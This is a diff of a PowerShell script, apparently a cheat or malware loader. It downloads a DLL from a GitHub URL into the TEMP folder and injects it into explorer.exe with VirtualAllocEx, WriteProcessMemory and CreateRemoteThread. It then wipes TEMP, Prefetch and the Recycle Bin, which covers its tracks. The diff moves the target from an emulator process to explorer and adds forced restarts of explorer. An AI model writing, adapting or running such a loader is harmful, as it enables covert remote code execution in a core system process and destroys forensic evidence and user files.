@@ -1,7 +1,7 @@
 # ================== CONFIG ===================== #
 $GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/textload-/main/textload.dll"
-$processName = "explorer.exe"
-$LocalDLL_Path = "$env:TEMP\textload.dll"  # Better to use TEMP folder than System32
+$processName = "explorer"  # Changed from HD-Player to explorer
+$LocalDLL_Path = "$env:TEMP\textload.dll"
 # =============================================== #
 
 # Function to check admin rights
@@ -17,12 +17,24 @@ if (-not (Test-Admin)) {
     exit
 }
 
-# Get process (with improved handling)
+# Get explorer process
 $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue | Select-Object -First 1
 
 if (-not $proc) {
-    Write-Host "[-] Process '$processName' not found. Make sure it's running."
-    exit
+    Write-Host "[-] Process '$processName' not found. Trying to start it..."
+    try {
+        Start-Process $processName
+        Start-Sleep -Seconds 3
+        $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue | Select-Object -First 1
+        if (-not $proc) {
+            Write-Host "[-] Failed to start explorer.exe"
+            exit
+        }
+    }
+    catch {
+        Write-Host "[-] Error starting explorer: $_"
+        exit
+    }
 }
 
 $TargetPID = $proc.Id
@@ -39,7 +51,7 @@ catch {
     exit
 }
 
-# Improved injector code
+# Injector code
 $injectorCode = @"
 using System;
 using System.Diagnostics;
@@ -90,7 +102,6 @@ public class Injector {
             throw new Win32Exception(Marshal.GetLastWin32Error());
         }
         
-        // Allocate memory in the remote process
         IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2),
             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
@@ -98,18 +109,15 @@ public class Injector {
             throw new Win32Exception(Marshal.GetLastWin32Error());
         }
         
-        // Write DLL path to remote process
         byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
         UIntPtr bytesWritten;
         if (!WriteProcessMemory(hProcess, allocMemAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten)) {
             throw new Win32Exception(Marshal.GetLastWin32Error());
         }
         
-        // Get address of LoadLibraryW
         IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
         IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
         
-        // Create remote thread
         IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, 
             allocMemAddress, 0, IntPtr.Zero);
         
@@ -117,7 +125,6 @@ public class Injector {
             throw new Win32Exception(Marshal.GetLastWin32Error());
         }
         
-        // Wait for injection to complete
         WaitForSingleObject(hThread, 5000);
     }
 }
@@ -135,12 +142,25 @@ catch {
 
 # Perform injection
 try {
-    Write-Host "[*] Injecting DLL into process..."
+    Write-Host "[*] Injecting DLL into explorer.exe..."
     [Injector]::Inject($TargetPID, $LocalDLL_Path)
-    Write-Host "✅ DLL injected successfully!"
+    Write-Host "✅ DLL injected successfully into explorer.exe!"
+    
+    # Refresh explorer to see changes
+    Write-Host "[*] Refreshing explorer..."
+    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
+    Start-Process explorer
 }
 catch {
     Write-Host "[-] Injection failed: $_"
+    # Try to restart explorer if injection failed
+    try {
+        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
+        Start-Process explorer
+    }
+    catch {
+        Write-Host "[!] Failed to restart explorer: $_"
+    }
 }
 
 # Cleaning section
@@ -152,23 +172,24 @@ try {
     }
     
     # Clear Temp
-    Get-ChildItem -Path $env:TEMP -Force | Where-Object { $_.Name -ne "" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+    Get-ChildItem -Path $env:TEMP -Force | Where-Object { $_.Name -ne $null } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
     Write-Host "[+] Temp folder cleared"
     
-    # Clear Prefetch (if possible)
+    # Clear Prefetch
     try {
         Get-ChildItem -Path "$env:SYSTEMROOT\Prefetch" -Force -ErrorAction Stop | Remove-Item -Force -ErrorAction SilentlyContinue
         Write-Host "[+] Prefetch cleared"
-    } catch { Write-Host "[*] Couldn't clear Prefetch (may require special permissions)" }
+    } catch { Write-Host "[*] Couldn't clear Prefetch (normal if not admin)" }
     
     # Empty Recycle Bin
-    $recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
-    $recycleBin.Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }
-    Write-Host "[+] Recycle Bin emptied"
+    try {
+        $recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
+        $recycleBin.Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }
+        Write-Host "[+] Recycle Bin emptied"
+    } catch { Write-Host "[-] Error emptying Recycle Bin: $_" }
 }
 catch {
     Write-Host "[-] Cleanup error: $_"
 }
 
 Write-Host "✅ Script completed"
-
